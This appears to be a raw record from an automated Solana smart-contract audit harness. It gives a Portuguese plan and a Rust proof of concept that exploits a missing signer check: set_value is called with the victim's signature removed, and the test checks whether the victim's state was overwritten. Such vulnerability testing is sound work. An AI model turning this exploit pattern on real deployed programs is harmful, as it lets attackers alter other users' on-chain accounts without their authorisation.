attempts.raw:
{
  "plan": "O atacante monta a conta PDA `data_account` derivada de ["data", vitima.key()] e passa a conta da vitima como `user`, sem que ela assine. O baseline usa a mesma instrucao com a vitima assinando, provando que o cenario esta correto. O ataque repete a chamada removendo a assinatura da vitima. O efeito medido e que a pubkey da vitima foi gravada no estado (offset 8..40) e o valor em 40..48, sem a assinatura da autoridade.",
  "scenario": "let program_id = env.program_id;
let victim = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let (data_pda, _bump) = Pubkey::find_program_address(&[b"data", victim.as_ref()], &program_id);

let value: u64 = 424242;
let mut ix_data = vec![1u8];
ix_data.extend_from_slice(&value.to_le_bytes());

let metas = vec![
    AccountMeta::new(data_pda, false),
    AccountMeta::new_readonly(victim, true),
];
let ix = env.raw_ix(&ix_data, metas);

let data_account = account(&program_id, &[0u8; 49], None);
let victim_account = wallet(1_000_000_000);
let contas = vec![
    (data_pda, data_account.clone()),
    (victim, victim_account.clone()),
];

let base = env.baseline("set_value legitimo com assinatura da vitima", &ix, &contas);

let metas_attack = vec![
    AccountMeta::new(data_pda, false),
    AccountMeta::new_readonly(victim, false),
];
let ix_attack = env.raw_ix(&ix_data, metas_attack);

let r = env.attack("set_value sem assinatura da vitima", &ix_attack, &contas);
if r.program_result == ProgramResult::Success {
    let d = after(&r, &data_pda).data();
    env.effect(
        "pubkey da vitima gravada no estado sem sua assinatura",
        read_pubkey(d, 8) == victim && read_u64(d, 40) == value,
    );
}"
}

